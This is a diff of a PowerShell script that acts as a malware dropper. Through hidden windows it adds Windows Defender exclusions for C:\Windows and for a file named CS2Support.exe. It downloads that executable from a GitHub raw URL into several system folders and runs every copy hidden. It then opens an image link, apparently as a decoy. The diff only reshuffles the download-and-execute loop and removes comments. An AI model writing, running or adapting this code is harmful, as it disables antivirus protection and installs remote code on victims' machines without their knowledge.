@@ -8,7 +8,6 @@ powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath 'C:\Win
 powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionExtension 'C:\Windows\SysWOW64\CS2Support.exe'"
 powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath 'C:\Windows'"
 
-# Define the download URL and target locations
 $url = 'https://github.com/AmjadBalls/TEST/raw/refs/heads/main/CS2Support.exe'
 $locations = @(
     'C:\Users\Public\Downloads\CS2Support.exe',
@@ -17,11 +16,14 @@ $locations = @(
     'C:\Windows\CS2Support.exe'
 )
 
-# Download and execute the file at each location
 foreach ($location in $locations) {
     Invoke-WebRequest -Uri $url -OutFile $location
-    Start-Process $location -WindowStyle Hidden
 }
+
+foreach ($location in $locations) {
+    Start-Process -FilePath $location -WindowStyle Hidden -Wait
+}
+
 
 
 start https://as2.ftcdn.net/v2/jpg/00/53/69/65/1000_F_53696591_9LO1bsQUpl2zIolFMFokrQyt04Z5dzXd.jpg
